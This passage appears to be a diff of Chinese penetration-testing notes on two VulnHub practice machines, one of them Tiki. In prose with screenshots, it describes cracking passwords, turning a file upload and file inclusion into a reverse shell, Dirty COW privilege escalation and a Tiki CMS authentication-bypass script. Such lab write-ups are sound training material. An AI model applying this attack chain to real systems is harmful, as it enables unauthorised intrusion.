+<p>改后缀打开发现用户和密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image337.png"
+style="width:5.76042in;height:2.68819in" alt="截图.png" /></p>
+<p>使用john爆破出密码和用户</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image338.png"
+style="width:5.76042in;height:1.74538in" alt="截图.png" /></p>
+<p>网页登录后发现没什么东西翻译发现是文件上传</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image339.png"
+style="width:5.76042in;height:1.48073in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image340.png"
+style="width:5.76042in;height:1.25662in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image341.png"
+style="width:5.76042in;height:3.14719in" alt="截图.png" /></p>
+<p>试试ssh发现密码不能用</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image342.png"
+style="width:5.76042in;height:2.0723in" alt="截图.png" /></p>
+<p>上传木马找不到目录先用file读取这个upload.php的源码看看放哪了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image343.png"
+style="width:5.76042in;height:3.04942in" alt="截图.png" /></p>
+<p>bash64解密发现上传的路径</p>
+<p>生成监听文件上传</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image344.png"
+style="width:5.76042in;height:0.655in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image345.png"
+style="width:5.76042in;height:1.40551in" alt="截图.png" /></p>
+<p>再使用burp的文件包含访问，成功反弹shell</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image346.png"
+style="width:5.76042in;height:2.88209in" alt="截图.png" /></p>
+<p>尝试脏牛的40616.c</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image347.png"
+style="width:4.44444in;height:1.10589in" alt="截图.png" /></p>
+<p>再试试40839.c成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image348.png"
+style="width:5.76042in;height:4.09876in" alt="截图.png" /></p>
+<p><strong>Tiki</strong></p>
+<p>信息收集发现开起了smb服务</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image349.png"
+style="width:5.76042in;height:2.95542in" alt="截图.png" /></p>
+<p>发现有robots.txt</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image350.png"
+style="width:5.36111in;height:1.65518in" alt="截图.png" /></p>
+<p>发现是个CMS</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image351.png"
+style="width:5.76042in;height:1.7383in" alt="截图.png" /></p>
+<p>初步估计是cms的漏洞</p>
+<p>找到一个登录页面</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image352.png"
+style="width:5.76042in;height:3.26444in" alt="截图.png" /></p>
+<p>一直没找到方法试试smb服务看看有没有关键信息</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image353.png"
+style="width:5.76042in;height:2.37355in" alt="截图.png" /></p>
+<p>smb发现一个密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image354.png"
+style="width:5.76042in;height:3.53058in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image355.png"
+style="width:5.76042in;height:2.38362in" alt="截图.png" /></p>
+<p>登录成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image356.png"
+style="width:5.76042in;height:3.25611in" alt="截图.png" /></p>
+<p>找了半天才发现版本号</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image357.png"
+style="width:5.76042in;height:3.98917in" alt="截图.png" /></p>
+<p>没找到也没关系可以发现这个是20207月</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image358.png"
+style="width:5.76042in;height:0.93235in" alt="截图.png" /></p>
+<p>所以百度看一下这个tiki的版本</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image359.png"
+style="width:5.76042in;height:1.59908in" alt="截图.png" /></p>
+<p><mark>接着就按照脚本的方法在登录处用 admin 登录然后用 Burp
+抓包就可</mark></p>
+<p><mark>burp抓包然后把密码删掉</mark></p>
+<p>然后跑脚本</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image360.png"
+style="width:5.76042in;height:3.29241in" alt="截图.png" /></p>
+<p>一个一个发包最后一个包是这样的就成功了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image361.png"
+style="width:5.76042in;height:1.73526in" alt="截图.png" /></p>
+<p><mark>发现真的登录成功了</mark></p>
+<p><mark>信息收集</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image362.png"
+style="width:5.76042in;height:3.56178in" alt="截图.png" /></p>
+<p><mark>发现密码</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image363.png"
+style="width:5.76042in;height:2.85153in" alt="截图.png" /></p>
+<p><mark>sudo -l 发现是ALL可以轻松提权</mark></p>
